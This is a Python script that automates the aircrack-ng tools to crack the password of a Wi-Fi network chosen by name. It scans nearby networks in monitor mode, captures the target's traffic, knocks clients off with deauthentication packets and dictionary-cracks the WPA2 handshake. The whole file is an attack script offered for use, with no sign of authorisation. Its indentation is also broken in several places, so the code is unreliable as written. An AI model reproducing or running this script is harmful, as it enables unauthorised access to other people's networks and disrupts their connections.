#!/usr/bin/env python
import subprocess
import csv
import os
import time

class HackingWifiNetworks:
    """Trying to determine wifi passwords. This automates the process using the aircrack modules"""
    def __init__(self, pot_pass = "List_pass"):
        """The init method runs the full automation process."""
        self.wifi_to_hack = ""
        self.potential_passwords = pot_pass
        self.matched_network = dict()   #Format for this dictionary is potential matches' {IP: [channel, name]}
        self.start()
        self.identification()
        self.find_pass()
        self.clean_up(["output-01.csv"])

    def run_bash(self, cmd):
        """This function allows the python script to execute bash commands"""
        subprocess.call("{}".format(cmd), shell=True)
        
    def start(self):
        """This method scans for Wifi networks and outputs them as a csv file to the desktop.
	   The user only has to enact the Keyboard interrupt to stop the scanning when desired."""
        self.run_bash("echo Disconnecting from wifi networks")
        time.sleep(1)
        self.run_bash("airmon-ng")
        time.sleep(1)
        self.run_bash("echo Enabling Monitor Mode")
        time.sleep(1)
        self.run_bash("airmon-ng start wlan0mon")
        self.run_bash("echo Scanning for local network, hit the Keyboard Interrupt 'ctrl+C' to stop scanning")
        time.sleep(1)
        try:
	        self.run_bash("airodump-ng wlan0 -w output --output-format csv")
        except KeyboardInterrupt:
	        self.run_bash("killall airodump-ng")
            self.wifi_to_hack = input("What is the name of the wifi network you wish to access?")
        return None
    
    def read_files(self, file_name, expected_num_values, desired_start, separator = ", "):
        """A generic read file generator to check bad file inputs and read line by line"""
        try:
            fp = open(file_name, 'rb') 
        except FileNotFoundError: 
            raise FileNotFoundError ("Could not open {}".format(file_name))
        else:
            with fp:
                x = 0
                for line in fp:
                    if x > desired_start:
                        st_line = str(line)
                        l = st_line.strip().split(separator)
                        if len(l) == expected_num_values:
                            yield l
                    x += 1

    def identification(self):
        """This function takes the information from the generator and then attempts to identify the information
           needed for the desired network, it compiles it into a dictionary"""
        read_network_ips = self.read_files("output-01.csv", 14, 1, separator = ", ")
        for bssid, first_time_seen, last_time_seen, channel, speed, privacy, cipher, authentication,\
            power, beacons, IV, LAN, en, name in read_network_ips:
            if name[:-1] == self.wifi_to_hack:
                print("Match found at this IP: {}".format(bssid))
                self.matched_network[bssid] = [channel.strip(), name[:-1]]
        print("Here is the network found: {}".format(self.matched_network))
        return None

    def find_pass(self):
	"""This attempts to crack the wifi networks password"""
        for bssid in self.matched_network.keys():
            self.run_bash("echo Accessing network:")
            station = ""
            try:
                self.run_bash("airodump-ng -c {} --bssid {} -w /root/Desktop/ wlan0".format(self.matched_network[bssid][0], bssid))
            except KeyboardInterrupt:
                self.run_bash("killall airodump-ng")
            find_station = self.read_files("-01.csv", 6, 4, separator = ", ")
            for stat, first_time_seen, last_time_seen, power, num_packets, bssid_1 in find_station:
                station=stat
            self.run_bash("echo Looking for passowrd:")
            time.sleep(1)
            try:
                self.run_bash("aireplay-ng -0 2 -a {} -c {} wlan0mon".format(bssid, station))
            except KeyboardInterrupt:
                self.run_bash("killall aireplay-ng")
            self.run_bash("aircrack-ng -a2 -b {} -w /root/{} /root/Desktop/*.cap".format(bssid, self.potential_passwords))
            self.clean_up(["-01.csv", "-01.kismet.netxml", "-01.cap", "-01.kismet.csv"])
	    return None

    def clean_up(self, remove_list):
        """This function deletes the scan results and other output files to prepare for the next 
        run-through of the script."""
        for file_to_remove in remove_list:
	    try:
      	    os.remove(file_to_remove)
	    except OSError:
		    print("The program didn't execute properly, so {} was never created and can't  be deleted!".format(file_to_remove))
	return None

def main():
    """This runs the whole class to see if a password can be identified"""
    hacking_wifi = HackingWifiNetworks()

if __name__ == "__main__":
    main()
